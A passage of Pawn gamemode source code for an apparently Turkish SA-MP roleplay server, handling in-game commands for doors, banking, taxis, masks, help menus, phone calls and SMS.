				MoveDynamicObject(LSPDObjs[1][0],275.75000000,120.89941406,1003.61718750, 3.5);
				MoveDynamicObject(LSPDObjs[1][1],275.75000000,118.89941406,1003.61718750, 3.5);
				LSPDObjs[1][2] = 1;
				PlayerPlaySoundEx(1083, 275.750000, 117.399414, 1003.617187);
				SetTimerEx("ShutUp",4000,false,"d",1);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 253.201660, 109.099609, 1002.220703))
			{
				MoveDynamicObject(LSPDObjs[2][0],253.20410156,105.59960938,1002.22070312,3.5);
				MoveDynamicObject(LSPDObjs[2][1],253.19921875,112.59960938,1002.22070312,3.5);
				LSPDObjs[2][2] = 1;
				PlayerPlaySoundEx(1083, 253.201660, 109.099609, 1002.220703);
				SetTimerEx("ShutUp",4000,false,"d",2);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 239.566894, 117.599609, 1002.220703))
			{
				MoveDynamicObject(LSPDObjs[3][0],239.56933594,114.09960938,1002.22070312,3.5);
				MoveDynamicObject(LSPDObjs[3][1],239.56445312,121.09960938,1002.22070312,3.5);
				LSPDObjs[3][2] = 1;
				PlayerPlaySoundEx(1083, 239.566894, 117.599609, 1002.220703);
				SetTimerEx("ShutUp",4000,false,"d",3);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 2.0, 265.951171, 115.826660, 1003.622863))
			{
				MoveDynamicObject(LSPDObjs[4][0],263.45,115.82421875,1003.62286377,3.5);
				MoveDynamicObject(LSPDObjs[4][1],268.75,115.82910156,1003.62286377, 3.5);
				LSPDObjs[4][2] = 1;
				PlayerPlaySoundEx(1083, 265.951171, 115.826660, 1003.622863);
				SetTimerEx("ShutUp",4000,false,"d",4);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 2.0, 265.820007, 112.530761, 1003.622863))
			{
				MoveDynamicObject(LSPDObjs[5][0],268.8,112.53222656,1003.62286377, 3.5);
				MoveDynamicObject(LSPDObjs[5][1],263.3,112.52929688,1003.62286377, 3.5);
				LSPDObjs[5][2] = 1;
				PlayerPlaySoundEx(1083, 265.820007, 112.530761, 1003.622863);
				SetTimerEx("ShutUp",4000,false,"d",5);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 231.099609, 119.532226, 1009.224426))
			{
				MoveDynamicObject(LSPDObjs[6][0],227.0,119.52929688,1009.22442627, 3.5);
				MoveDynamicObject(LSPDObjs[6][1],229.75,119.53515625,1009.22442627, 3.5);
				LSPDObjs[6][2] = 1;
				PlayerPlaySoundEx(1083, 231.099609, 119.532226, 1009.224426);
				SetTimerEx("ShutUp",4000,false,"d",6);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 3.0, 217.800003, 116.529647, 998.015625))
			{
				MoveDynamicObject(LSPDObjs[7][0],220.5,116.52999878,998.01562500,3.5);
				MoveDynamicObject(LSPDObjs[7][1],215.3,116.52929688,998.01562500,3.5);
				LSPDObjs[7][2] = 1;
				PlayerPlaySoundEx(1083, 217.800003, 116.529647, 998.015625);
				SetTimerEx("ShutUp",4000,false,"d",7);
			}
			else if(IsPlayerInRangeOfPoint(playerid, 15, 2720.22, -2405.38, 14.22))
	        {
				if(!kapi[0][1])
				{
					MoveDynamicObject(kapi[0][0], 2719.9004000,-2409.5996000,12.5000000, 5.0);
					kapi[0][1] = true;
				}
				else
				{
					MoveDynamicObject(kapi[0][0], 2720.12012, -2401.25684, 12.50000, 5.0);
					kapi[0][1] = false;
				}
	        }
	        else if(IsPlayerInRangeOfPoint(playerid, 15, 2720.2151, -2504.0979, 14.2159))
	        {
				if(!kapi[1][1])
				{
					MoveDynamicObject(kapi[1][0], 2720.00000, -2508.30005, 12.50000, 5.0);
					kapi[1][1] = true;
				}
				else
				{
					MoveDynamicObject(kapi[1][0], 2720.06299, -2499.72754, 12.50000, 5.0);
					kapi[1][1] = false;
				}
	        }
	        else if(IsPlayerInRangeOfPoint(playerid, 7, 1588.53,-1637.98,14.98))
		    {
				if(lspdgaraj[1])
				{
					MoveStroyObject( lspdgaraj[0], 1588.53,-1637.98,14.98,2.00);
					lspdgaraj[1] = 0;
				}
				else
				{
					MoveStroyObject( lspdgaraj[0], 1596.73,-1637.98,14.98,2.00);
					lspdgaraj[1] = 1;
				}
		    }
		    else if(IsPlayerInRangeOfPoint(playerid, 3, 1034.594, 2603.353, 703.745))
		    {
		        if(lspdkapi[1])
		        {
		            MoveStroyObject( lspdkapi[0], 1034.59399, 2603.35303, 703.74500, 2.00);
		            lspdkapi[0] = 0;
				}
				else
				{
				    MoveStroyObject( lspdkapi[0], 1034.614, 2603.373, 700.650, 2.00);
				    lspdkapi[0] = 1;
				}
			}
			/*else if(PlayerToPoint(7, playerid, 1544.69,-1630.89,13.08))
	        {
				if(lspdcubuk[1])
				{
					SetDynamicObjectRot( lspdcubuk[0], 0.00,90.00,90.00);
					lspdcubuk[1] = 0;
				}
				else
				{
					SetDynamicObjectRot( lspdcubuk[0], 0.00,0.00,0.00);
					lspdcubuk[1] = 1;
				}
	        }*/
			else if(PlayerToPoint(2.0, playerid,199.8965,103.4586,958.6868))
			{
			    if(lspdkodes[0] == 0)
			    {
					MoveStroyObject(lspdkodes[0],198.6165,103.4586,958.6868,2.0);
					lspdkodes[0] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[0],199.8965,103.4586,958.6868,2.0);
					lspdkodes[0] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,196.4070,103.4971,958.6868))
			{
			    if(lspdkodes[1] == 0)
			    {
					MoveStroyObject(lspdkodes[1],197.6670,103.4971,958.6868,2.0);
					lspdkodes[1] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[1],196.4070,103.4971,958.6868,2.0);
					lspdkodes[1] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,188.2365,107.1839,958.6876))
			{
			    if(lspdkodes[2] == 0)
			    {
					MoveStroyObject(lspdkodes[2],186.9165,107.1839,958.6876,2.0);
					lspdkodes[2] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[2],188.2365,107.1839,958.6876,2.0);
					lspdkodes[2] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,188.2281,110.8808,958.6879))
			{
			    if(lspdkodes[3] == 0)
			    {
					MoveStroyObject(lspdkodes[3],186.8681,110.8808,958.6879,2.0);
					lspdkodes[3] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[3],188.2281,110.8808,958.6879,2.0);
					lspdkodes[3] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,193.2098,110.9184,958.6873))
			{
			    if(lspdkodes[4] == 0)
			    {
					MoveStroyObject(lspdkodes[4],191.8898,110.9184,958.6873,2.0);
					lspdkodes[4] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[4],193.2098,110.9184,958.6873,2.0);
					lspdkodes[4] = 0;
				}
			}

			else if(PlayerToPoint(2.0, playerid,193.20641, 107.17330, 958.68732))
			{
			    if(lspdkodes[5] == 0)
			    {
					MoveStroyObject(lspdkodes[5],191.74640, 107.17330, 958.68732,2.0);
					lspdkodes[5] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[5],193.20641, 107.17330, 958.68732,2.0);
					lspdkodes[5] = 0;
				}
			}
			else if(PlayerToPoint(2.0, playerid,240.68280, -895.26752, 640.32617))
			{
			    if(lspdkodes[6] == 0)
			    {
					MoveStroyObject(lspdkodes[6],242.10310, -895.28918, 640.32617,2.0);
					lspdkodes[6] = 1;
				}
				else
				{
					MoveStroyObject(lspdkodes[6],240.68280, -895.26752, 640.32617,2.0);
					lspdkodes[6] = 0;
				}
			}
		}
	    return 1;
	}

	if(!strcmp("/kaydet", string, true))
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
	    {
			for(new vid; vid<MAX_VEHICLES; vid++) AracKaydet(vid);
			for(new uyid; uyid<MAX_DRUGS; uyid++) UyusturucuKaydet(uyid);
			for(new mid2; mid2<MAX_MOBILYA; mid2++) MobilyaKaydet(mid2);
			for(new uyid; uyid<MAX_ATM; uyid++) ATMKaydet(uyid);
			for(new uyid; uyid<MAX_GATE; uyid++) GateKaydet(uyid);
			for(new fid; fid<MAX_BIRLIK; fid++) BirlikKaydet(fid);
			for(new i; i<MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i)) KarakterKaydet(i);
			}
			Bilgi(playerid, "Araçlar, uyuþturucular, mobilyalar, atmler, gateler, birlikler, karakterler kaydedildi.");
	    }
	    return 1;
	}

	if(!strcmp("/banka", string, true))
	{
	    if(Karakter[playerid][hesapno] != 0)
	    {
	        if(IsPlayerInRangeOfPoint(playerid, 2.0, Veriler[bankX], Veriler[bankY], Veriler[bankZ]))
	        {
				format(string,sizeof(string),"{FFFFFF}Hoþgeldiniz!\nHesap No: %d\nHesabýnýzda Bulunan Para Miktarý: %d",Karakter[playerid][hesapno],BankaPara(playerid));
				ShowPlayerDialog(playerid, 127, DIALOG_STYLE_MSGBOX, ""C7"EIGHTBORN - "C8"Santos Bank", string, "Ýleri", "Kapat");
			}
		}
		else Hata(playerid, "Banka hesabýnýz bulunmamaktadýr.");
		return 1;
	}
	if(!strcmp("/tisbasi", string, true))
	{
     	if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Taksi içerisinde deðilsiniz.");
 		new veh = GetPlayerVehicleID(playerid);
 		if(Arac[veh][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][birlik] == Arac[veh][abirlik]) || AracAnahtarKontrol(playerid, veh))
 		{
 		if(Arac[veh][amodel] == 438 || Arac[veh][amodel] == 420)
 		{
			if(tisbasi[playerid] == 0)
				{
			    tisbasi[playerid] = 1;
				new nstring[128];
				format(nstring, sizeof(nstring), "[LS Taksi] 7/24 hizmetinizde! Ýletiþim: %s - %d", OyuncuAdiniBul(playerid), Karakter[playerid][telno]);
				SendClientMessageToAll(0x00C300FF, nstring);
				Bilgi(playerid, "Ýþbaþý oldunuz.");
				}
				else if(tisbasi[playerid] == 1)
				{
			    tisbasi[playerid] = 0;
		  		Bilgi(playerid, "Ýþbaþýndan çýktýnýz.");
				}
			}
			else Hata(playerid, "Bu araç taksi deðil.");
		}
		else Hata(playerid, "Bu aracýn anahtarý sizde yok.");
	    return 1;
	}
	if(!strcmp("/taksimetre", string, true) || !strcmp("/tm", string, true) )
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araç içerisinde deðilsiniz.");
 		new veh = GetPlayerVehicleID(playerid);
 		if(Arac[veh][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][birlik] == Arac[veh][abirlik]) || AracAnahtarKontrol(playerid, veh))
 		{
 		if(Arac[veh][amodel] == 438 || Arac[veh][amodel] == 420)
 		{
		if(Taksimetre[veh][0])
		{
		    MeGonder(playerid, 30.0, "taksimetreyi kapatýr.");
		    Bilgi(playerid, "Taksimetreyi kapattýnýz.");
		    Taksimetre[veh][0] = false;
		    Taksimetre[veh][1] = 0;
		    Taksimetre[veh][2] = 0;
		    foreach(new i : Player)
		    {
		        if(IsPlayerInVehicle(i, veh))
		    		PlayerTextDrawSetString(i, TaksimetreTD[playerid], "$0");
			}
		    return 1;
		}
	    if(Arac[veh][amodel] == 438 || Arac[veh][amodel] == 420)
		{
		    MeGonder(playerid, 30.0, "taksimetreyi açar.");
  			Bilgi(playerid, "Taksimetreyi açtýnýz.");
			Taksimetre[veh][0] = true;
			Taksimetre[veh][1] = 0;
			Taksimetre[veh][2] = 2;
			foreach(new i : Player)
		    {
		        if(IsPlayerInVehicle(i, veh))
		    		TaksimetreGoster(i);
			}
		}
		}
			else Hata(playerid, "Bu araç taksi deðil.");
		}
		else Hata(playerid, "Bu aracýn anahtarý sizde yok.");
	    return 1;
	}
	if(!strcmp("/tmsifirla", string, true))
	{
	    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Araç içerisinde deðilsiniz.");
 		new veh = GetPlayerVehicleID(playerid);
 		if(Arac[veh][aowner] == Karakter[playerid][sqlid] || (Karakter[playerid][birlik] == Arac[veh][abirlik]) || AracAnahtarKontrol(playerid, veh))
 		{
	 		if(Arac[veh][amodel] == 438 || Arac[veh][amodel] == 420)
	 		{
			    MeGonder(playerid, 30.0, "taksimetreyi sýfýrlar.");
	  			Bilgi(playerid, "Taksimetreyi sýfýrladýnýz.");
				Taksimetre[veh][0] = true;
				Taksimetre[veh][1] = 0;
				Taksimetre[veh][2] = 2;
				foreach(new i : Player)
			    {
			        if(IsPlayerInVehicle(i, veh)) {
			    		TaksimetreGoster(i);
			    		PlayerTextDrawSetString(i, TaksimetreTD[playerid], "$0");
					}
				}
			}
			else Hata(playerid, "Bu araç taksi deðil.");
		}
		else Hata(playerid, "Bu aracýn anahtarý sizde yok.");
	    return 1;
	}
	if(!strcmp("/pdmaske", string, true))
	{
	    if(Birlik[Karakter[playerid][birlik]][ftip] == FBI || Karakter[playerid][adminlevel] >= 6)
	    {
	        if(!Maske2[playerid])
	        {
	            Bilgi(playerid, "Maskenizi taktýnýz.");
	            UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), "Tanýnmýyor");
	            Maske2[playerid] = true;
	            /*foreach(new i : Player)
			    {
					ShowPlayerNameTagForPlayer(i, playerid, false);
				}*/
	        }
	        else
	        {
	            Bilgi(playerid, "Maskenizi çýkardýnýz.");
	            format(string, sizeof(string), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
				UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string);
	            Maske2[playerid] = false;
	            /*foreach(new i : Player)
			    {
					ShowPlayerNameTagForPlayer(i, playerid, true);
				}*/
			}
		}
		else Hata(playerid, "Bu komutu kullanmak için FBI olmanýz gerekmektedir.");
  		return 1;
	}
	if(!strcmp("/maske", string, true))
	{
	    /*if(Karakter[playerid][maske] == 1)
	    {
	        if(!Maske[playerid])
	        {
	            Bilgi(playerid, "Maskenizi taktýnýz.");
	        	format(string, sizeof(string), "Maskeli(%d)", Karakter[playerid][maskeno]);
				UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string);
				Maske[playerid] = true;
			}
			else
	        {
	            Bilgi(playerid, "Maskenizi çýkardýnýz.");
                format(string, sizeof(string), "%s(%d)", OyuncuAdiniBul(playerid), playerid);
				UpdateDynamic3DTextLabelText(tanismaIsim[playerid], GetPlayerColor(playerid), string);
				Maske[playerid] = false;
			}
		}
		else Hata(playerid, "Bir maskeye sahip deðilsiniz.");*/
		return Hata(playerid, "Ýnaktif!");
		//return 1;
	}
	if(!strcmp(string, "/baliklarim", true))
	{
	    if(Karakter[playerid][olta] == 1)
	    {
	        format(string, sizeof(string), "Balýk Sayýsý: %d/20", Karakter[playerid][balik]),Bilgi(playerid, string);
	        format(string, sizeof(string), "Karides Sayýsý: %d/30", Karakter[playerid][yemmiktar][1]),Bilgi(playerid, string);
	        format(string, sizeof(string), "Kurt Sayýsý: %d/30", Karakter[playerid][yemmiktar][2]),Bilgi(playerid, string);
	        format(string, sizeof(string), "Ekmek Sayýsý: %d/30", Karakter[playerid][yemmiktar][3]),Bilgi(playerid, string);
		}
		return 1;
	}
	if(strcmp(string, "/payd", true) == 0)
	{
		if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
		{
	    	string = strtok(cmdtext, idx);
			Karakter[playerid][payday] = strval(string);
		}
		return 1;
	}
	if(strcmp(string, "/telefonyardim", true) == 0)
	{
		format(string, sizeof(string), ""C7"| Telefon Yardým |");
		SendClientMessage(playerid, BIZIMYESIL, string);
	    SendClientMessage(playerid, COLOR_WHITE, "/telefon, /teldurum, /ara, /sms, /numaragizle, /gengelle, /tac, /tkapat");
		return 1;
	}
	if(strcmp(string, "/taksiyardim", true) == 0)
	{
		format(string, sizeof(string), ""C7"| Taksi Yardým |");
		SendClientMessage(playerid, BIZIMYESIL, string);
	    SendClientMessage(playerid, COLOR_WHITE, "/tisbasi, /taksimetre(/tm), /tmsifirla");
		return 1;
	}
	if(strcmp(string, "/telsizyardim", true) == 0)
	{
		format(string, sizeof(string), ""C7"| Telsiz Yardým |");
		SendClientMessage(playerid, BIZIMYESIL, string);
	    SendClientMessage(playerid, COLOR_WHITE, "/t(elsiz), /frekans");
		return 1;
	}
	if(strcmp(string, "/aracyardim", true) == 0 || strcmp(string, "/arabayardim", true) == 0)
	{
		format(string, sizeof(string), ""C7"| Araç Yardým |");
		SendClientMessage(playerid, BIZIMYESIL, string);
	    SendClientMessage(playerid, COLOR_WHITE, "/a(rac), /ruhsatgoster, /cw, /asqlid, /ekemer, /kask");
		return 1;
	}
	if(strcmp(string, "/evyardim", true) == 0)
	{
		format(string, sizeof(string), ""C7"| Ev Yardým |");
		SendClientMessage(playerid, BIZIMYESIL, string);
		SendClientMessage(playerid, COLOR_WHITE, "/evkirala, /evkiradurumu, /evkirafiyati, /evanahtar, /mobilya, /evzil, /ornekdaire");
	    SendClientMessage(playerid, COLOR_WHITE, "/satinal, /evsat, /evkilit, /evlerim, /evcati giriþ/çýkýþ için Y tuþu");
		return 1;
	}
	if(strcmp(string, "/isyeriyardim", true) == 0)
	{
		format(string, sizeof(string), ""C7"| Ýþyeri Yardým |");
		SendClientMessage(playerid, BIZIMYESIL, string);
		SendClientMessage(playerid, COLOR_WHITE, "/ikirala, /ikirafiyati, /ikiradurumu, /iortak, /ikasa, /imuzik, /ornekisyeri");
	    SendClientMessage(playerid, COLOR_WHITE, "/satinal, /ikilit, /iyonet, /isyerlerim, /isyerisat, /icati giriþ/çýkýþ için Y tuþu");
		return 1;
	}
	if(strcmp(string, "/birlikyardim", true) == 0)
	{
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD)
		{
			format(string, sizeof(string), ""C7"| Birlik Yardým |");
   			SendClientMessage(playerid, BIZIMYESIL, string);
		    SendClientMessage(playerid, COLOR_WHITE, "/kelepce, /taser, /tutukla, /cezakes, /t(elsiz), /yt(yakýn telsiz), /d(departmanlar arasý telsiz), /mdc");
		    SendClientMessage(playerid, COLOR_WHITE, "/barikat, /m(/megafon), /m1, /elkoy, /beanbag, /siren, /hapisliste, /kapikir, /ihbarlar /ekip");
			SendClientMessage(playerid, COLOR_WHITE, "/giseler, /bagliaraclar, /muhurle, /a cek, /telsizkodlari, /ekipman, /pdrutbe, /tuzak, /pmac, /ppark");
		}
		else if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
		{
			format(string, sizeof(string), ""C7"| Birlik Yardým |");
			SendClientMessage(playerid, COLOR_WHITE, "/yayin, /yayindavet, /yayincikar, /muzikyayin, /t(elsiz), /mikrofonver, /reklamlar");
		}
		else if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA)
		{
			format(string, sizeof(string), ""C7"| Birlik Yardým |");
   			SendClientMessage(playerid, BIZIMYESIL, string);
		    SendClientMessage(playerid, COLOR_WHITE, "/kelepce, /taser, /telsiz(/t), /yt(yakýn telsiz), /d(departmanlar arasý telsiz)");
		    SendClientMessage(playerid, COLOR_WHITE, "/barikat, /m(/megafon), /m1, /elkoy, /beanbag, /telsizkodlari");
		}
		else if(Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
			format(string, sizeof(string), ""C7"| Birlik Yardým |");
   			SendClientMessage(playerid, BIZIMYESIL, string);
   			SendClientMessage(playerid, COLOR_WHITE, "/rozetgoster, /pdmaske, /pdaksesuar, /kelepce, /siren, /elkoy, /ihbarlar, /fbi, /beanbag, /telsizkodlari /fbituzak");
		    SendClientMessage(playerid, COLOR_WHITE, "/taser, /yt(yakýn telsiz), /ftelsiz(fbi telsiz), /operator, /d(departmanlar arasý telsiz), /bagliaraclar /fbisiren");
		}
		else if(Birlik[Karakter[playerid][birlik]][ftip] == LSFD)
		{
			format(string, sizeof(string), ""C7"| Birlik Yardým |");
   			SendClientMessage(playerid, BIZIMYESIL, string);
   			SendClientMessage(playerid, COLOR_WHITE, "/fdekipman, /t, /yt, /operator, /d, /fdspawn, /fdtamir, /barikat, /pddestekiste(/pdde)(/pddestek)");
		}
		else if(Karakter[playerid][birlik] != 0)
		{
		    format(string, sizeof(string), ""C7"| Birlik Yardým |");
		    SendClientMessage(playerid, BIZIMYESIL, string);
		    SendClientMessage(playerid, COLOR_WHITE, "/birlik, /faktif, /faction, /birlikcik");
		}
		return 1;
	}
    if(strcmp(string, "/telefondurum", true) == 0 || strcmp(string, "/teldurum", true) == 0)
    {
        if(!Karakter[playerid][telno]) return Hata(playerid, "Telefonunuz yok.");
		if(Karakter[playerid][teldurum] == 1)
		{
			new Float:soonX, Float:soonY, Float:soonZ;
			GetPlayerPos(playerid, soonX, soonY, soonZ);
			Karakter[playerid][sonx] = soonX;
			Karakter[playerid][sony] = soonY;
			Karakter[playerid][sonz] = soonZ;
			Karakter[playerid][sonvw] = GetPlayerVirtualWorld(playerid);
			Karakter[playerid][sonint] = GetPlayerInterior(playerid);
		    Karakter[playerid][teldurum] = 0;
		    Bilgi(playerid, "Telefonunuzu kapattýnýz.");
		}
		else
		{
		    Karakter[playerid][teldurum] = 1;
		    Bilgi(playerid, "Telefonunuzu açtýnýz.");
		}
    	return 1;
	}
	if(strcmp(string, "/teltakip", true) == 0 ||strcmp(string, "/telefontakip", true) == 0)
	{
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
		    if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][rutbe] > 11) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
		    new Buldum = 0;
		    string = strtok(cmdtext, idx);
		    new telNO = strval(string);
		    if(!strlen(string))
		    {
				Kullanim(playerid, "/telefontakip [numara]");
				return 1;
			}
			for(new i; i < MAX_PLAYERS; i++)
			{
			    if(Karakter[i][telno] == telNO && Karakter[i][teldurum] == 1)
			    {
			        if(Karakter[i][sonint] == 0)
			        {
			            new BolgeBulucu[MAX_ZONE_NAME], Float:pPos[3];
						GetPlayerZone(i, BolgeBulucu, MAX_ZONE_NAME);
			            SetPVarInt(playerid, "LSPDTelTakip", 1);
						GetPlayerPos(i, pPos[0],pPos[1],pPos[2]);
						SetPlayerCheckpoint(playerid,pPos[0],pPos[1],pPos[2],5.0);
					    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}----------LSPD VERITABANI SONUÇLARI----------");
						format(string, sizeof(string), "Telefon numarasý: %d", telNO);
						SendClientMessage(playerid, COLOR_WHITE, string);
						format(string, sizeof(string), "{CCE6E6}Bulunduðu bölge: %s", BolgeBulucu);
						SendClientMessage(playerid, COLOR_WHITE, string);
						SendClientMessage(playerid, COLOR_WHITE, "Telefon durumu: Açýk");
						Buldum++;
						return 1;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}----------LSPD VERITABANI SONUÇLARI----------");
						format(string, sizeof(string), "Telefon numarasý: %d", telNO);
						SendClientMessage(playerid, COLOR_WHITE, string);
						format(string, sizeof(string), "{CCE6E6}Bulunduðu bölge: Bulunamadý");
						SendClientMessage(playerid, COLOR_WHITE, string);
						SendClientMessage(playerid, COLOR_WHITE, "Telefon durumu: Açýk");
						Buldum++;
						return 1;
					}
				}
				if(Karakter[i][telno] == telNO && Karakter[i][teldurum] == 0)
			    {
			        if(GetPlayerInterior(i) == 0)
			        {
						SetPVarInt(playerid, "LSPDTelTakip", 1);
						SetPlayerCheckpoint(playerid,Karakter[i][sonx],Karakter[i][sony],Karakter[i][sonz],5.0);
					    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}----------LSPD VERITABANI SONUÇLARI----------");
						format(string, sizeof(string), "Telefon numarasý: %d", telNO);
						SendClientMessage(playerid, COLOR_WHITE, string);
						format(string, sizeof(string), "{CCE6E6}Son Bulunduðu bölge: GPS");
						SendClientMessage(playerid, COLOR_WHITE, string);
						SendClientMessage(playerid, COLOR_WHITE, "Telefon durumu: Kapalý");
						SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}GPS aktif edildi, son konum haritada iþaretlendi.");
						Buldum++;
						return 1;
					}
					else
					{
					    SendClientMessage(playerid, COLOR_WHITE, "{CCE6E6}----------LSPD VERITABANI SONUÇLARI----------");
						format(string, sizeof(string), "Telefon numarasý: %d", telNO);
						SendClientMessage(playerid, COLOR_WHITE, string);
						format(string, sizeof(string), "{CCE6E6}Son Bulunduðu bölge: Bulunamadý");
						SendClientMessage(playerid, COLOR_WHITE, string);
						SendClientMessage(playerid, COLOR_WHITE, "Telefon durumu: Kapalý");
						Buldum++;
						return 1;
					}
				}
			}
			if(Buldum == 0)
			{
			    Hata(playerid, "Hatalý bir numara girdiniz veya sonuç bulunamadý.");
				return 1;
			}
		}
		else
		{
		    Hata(playerid, "Devlet görevlisi deðilsiniz.");
		    return 1;
		}
		return 1;
	}
	if(!strcmp(string, "/telefon", true))
	{
	    if(!Karakter[playerid][telno])return Hata(playerid,"Telefonunuz yok.");
	    if(Karakter[playerid][kodes] != 0) return Hata(playerid, "Hapiste telefonunuzu kullanamazsýnýz.");
		if(Karakter[playerid][teldurum] == 0) return Hata(playerid, "Telefonunuz kapalý, iþlem yapamazsýnýz.");
	    if(GetPVarInt(playerid, "TelElinde")) {
	        HidePlayerPhone(playerid);
		}
	    else {
		    if(Arama[playerid][0] == 0 && Arama[playerid][1] == 0 && Arama[playerid][2] == 0) ShowPlayerPhone(playerid);
	    	else AramaEkrani(playerid);
		    OnPlayerCommandPerformed(playerid,"/ame telefonunu eline alýr.",0);
		}
		return 1;
	}
	if(!strcmp(string, "/numaram", true))
	{
	    if(!Karakter[playerid][telno])return Hata(playerid,"Telefonunuz yok.");
	    if(Karakter[playerid][kodes] != 0) return Hata(playerid, "Hapiste telefonunuzu kullanamazsýnýz.");
		format(string, sizeof(string), "Telefon numaranýz: %d", Karakter[playerid][telno]);
		Bilgi(playerid, string);
		return 1;
	}
    if(!strcmp(string, "/ara", true))
    {
		if(!Karakter[playerid][telno])return Hata(playerid,"Telefonunuz yok.");
		if(Karakter[playerid][kodes] != 0) return Hata(playerid, "Hapiste telefonunuzu kullanamazsýnýz.");
		if(Karakter[playerid][teldurum] == 0) return Hata(playerid, "Telefonunuz kapalý, iþlem yapamazsýnýz.");
        string = strtok(cmdtext, idx);
        if(isnull(string)) return Kullanim(playerid, "/ara [numara]");
        AramaYap(playerid, strval(string));
        OnPlayerCommandPerformed(playerid,"/ame telefonunu eline alýr ve kulaðýna götürür.",0);
        return 1;
    }
    if(!strcmp(string, "/tac", true))
    {
		if(!Karakter[playerid][telno])return Hata(playerid,"Telefonunuz yok.");
		if(Karakter[playerid][kodes] != 0) return Hata(playerid, "Hapiste telefonunuzu kullanamazsýnýz.");
		if(Karakter[playerid][teldurum] == 0) return Hata(playerid, "Telefonunuz kapalý, iþlem yapamazsýnýz.");
        foreach(new i : Player)
	    {
	        if(Arama[playerid][1] == Karakter[i][telno] && Arama[playerid][1] != 0)
	        {
	            Arama[i][0] = 0;
	            Arama[playerid][1] = 0;
    	    	Arama[playerid][2] = Karakter[i][telno];
    	    	Arama[i][2] = Karakter[playerid][telno];
				SetPlayerAttachedObject(playerid,INDEX_TELEFON,18865,6,0.096000,0.009000,-0.008000,75.399963,179.899902,0.000000,1.000000,1.000000,1.000000);
    	    	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USECELLPHONE);
    	    	Bilgi(i, "Telefonunuz açýldý.");
    	    	OnPlayerCommandPerformed(playerid,"/ame telefonunu eline alýr ve kulaðýna götürür.",0);
	            return 1;
	        }
	    }
	    Hata(playerid, "Telefonunuz çalmýyor.");
        return 1;
    }
    if(!strcmp(string, "/tkapat", true))
    {
		if(!Karakter[playerid][telno])return Hata(playerid,"Telefonunuz yok.");
		if(Karakter[playerid][kodes] != 0) return Hata(playerid, "Hapiste telefonunuzu kullanamazsýnýz.");
		if(Karakter[playerid][teldurum] == 0) return Hata(playerid, "Telefonunuz kapalý, iþlem yapamazsýnýz.");
		if(Arama[playerid][2] == 0) return Hata(playerid, "Telefonunuz zaten kapalý.");
        foreach(new i : Player)
        {
	        if(Arama[playerid][0] == Karakter[i][telno] || Arama[playerid][1] == Karakter[i][telno] || Arama[playerid][2] == Karakter[i][telno])
	        {
	            Arama[i][0] = 0;
	            Arama[i][1] = 0;
	            Arama[i][2] = 0;
	            Arama[i][3] = 0;
	            Arama[playerid][0] = 0;
	            Arama[playerid][1] = 0;
	            Arama[playerid][2] = 0;
	            Arama[playerid][3] = 0;
	            HidePlayerPhone(playerid);
	            HidePlayerPhone(i);
				RemovePlayerAttachedObject(playerid,INDEX_TELEFON);
    	    	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_STOPUSECELLPHONE);
				RemovePlayerAttachedObject(i,INDEX_TELEFON);
    	    	SetPlayerSpecialAction(i,SPECIAL_ACTION_STOPUSECELLPHONE);
    	    	OnPlayerCommandPerformed(playerid,"/ame telefonunu kapatarak cebine koyar.",0);
	            return 1;
	        }
	    }
	    Hata(playerid, "Telefonunuz çalmýyor.");
        return 1;
    }
    if(!strcmp(string, "/sms", true))
    {
		if(!Karakter[playerid][telno])return Hata(playerid,"Telefonunuz yok.");
		if(Karakter[playerid][kodes] != 0) return Hata(playerid, "Hapiste telefonunuzu kullanamazsýnýz.");
		if(Karakter[playerid][teldurum] == 0) return Hata(playerid, "Telefonunuz kapalý, iþlem yapamazsýnýz.");
        string = strtok(cmdtext, idx);
        if(isnull(string)) return Kullanim(playerid, "/sms [numara] [mesaj]");
        new num = strval(string);
		new length = strlen(cmdtext);
		while ((idx < length) && (cmdtext[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[256];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
